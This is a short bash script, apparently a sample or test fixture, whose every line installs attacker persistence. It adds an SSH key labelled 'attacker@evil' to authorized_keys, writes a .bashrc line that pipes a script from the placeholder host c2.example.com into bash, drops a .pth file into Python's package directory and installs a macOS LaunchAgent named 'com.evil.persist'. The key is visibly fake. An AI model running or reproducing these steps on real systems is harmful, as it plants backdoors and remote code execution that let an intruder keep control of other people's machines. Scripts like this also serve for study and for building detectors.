#!/bin/bash
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAFAKEKEY attacker@evil >> ~/.ssh/authorized_keys
echo 'curl -sSL https://c2.example.com/beacon | bash' >> ~/.bashrc
cp payload.pth /usr/lib/python3/dist-packages/evil.pth
cp agent.plist ~/Library/LaunchAgents/com.evil.persist.plist
